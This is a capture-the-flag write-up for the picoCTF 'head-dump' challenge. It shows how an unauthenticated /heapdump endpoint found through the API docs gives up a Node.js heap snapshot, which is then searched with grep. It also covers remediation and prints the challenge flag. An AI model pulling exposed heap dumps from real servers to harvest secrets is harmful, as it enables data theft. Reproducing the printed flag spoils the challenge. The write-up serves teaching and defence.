# picoCTF — head-dump

## 1. Executive Summary

The `head-dump` challenge contains a web application that exposes an API documentation interface. During testing, the `/heapdump` endpoint was identified under the **Diagnosing** API category.

The endpoint allowed an unauthenticated user to download a Node.js/V8 heap snapshot containing data from the server's memory. Sensitive information, including the challenge flag, was present within the dump.

**Severity:** High

**Vulnerability:** Sensitive Information Exposure via Heap Dump

---

## 2. Target

```text
http://TARGET_IP:PORT
```

---

## 3. Reconnaissance

The application contained a link to:

```text
/api-docs/
```

The API documentation revealed a section named:

```text
Diagnosing
```

Within this section, the following endpoint was identified:

```text
GET /heapdump
```

---

## 4. Vulnerability Identification

The endpoint was tested using:

```bash
curl -X 'GET' \
  'http://TARGET_IP:PORT/heapdump' \
  -H 'accept: */*'
```

The server returned:

```text
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Content-Disposition: attachment; filename="heapdump-XXXXXXXXXXXX.heapsnapshot"
```

A heap snapshot of approximately 11 MB was downloaded.

---

## 5. Exploitation

The downloaded file was verified using:

```bash
ls -lh heapdump-XXXXXXXXXXXX.heapsnapshot
file heapdump-XXXXXXXXXXXX.heapsnapshot
```

The file was identified as ASCII text containing very long lines, consistent with a V8 heap snapshot.

The dump was searched for the flag pattern:

```bash
grep -aEio 'picoCTF\{[^}]+\}' heapdump-XXXXXXXXXXXX.heapsnapshot
```

The flag was recovered from the server's memory:

```text
picoCTF{Pat!3nt_15_Th3_K3y_dc0756a3}
```

---

## 6. Impact

Exposing a heap dump can disclose sensitive information stored in server memory, including:

* Authentication tokens
* API keys
* Passwords or credentials
* Session information
* Application secrets
* Internal application data
* Sensitive user information

In this challenge, the heap dump contained the flag.

---

## 7. Root Cause

The application exposed a diagnostic heap-dump endpoint without sufficient access control.

An attacker able to access the endpoint could obtain a snapshot of the application's memory and search it for sensitive information.

---

## 8. Remediation

* Restrict `/heapdump` to authenticated administrators.
* Disable diagnostic endpoints in production environments.
* Avoid exposing debugging functionality publicly.
* Implement authorization checks for sensitive diagnostic operations.
* Ensure secrets are not unnecessarily retained in application memory.
* Monitor and log access to diagnostic endpoints.

---

## 9. Conclusion

The challenge was successfully compromised by discovering the exposed `/heapdump` endpoint through the API documentation. The endpoint provided a server-side V8 heap snapshot containing sensitive information.

The flag was successfully extracted from the heap dump using `grep`.

**Flag:**

```text
picoCTF{Pat!3nt_15_Th3_K3y_dc0756a3}
```
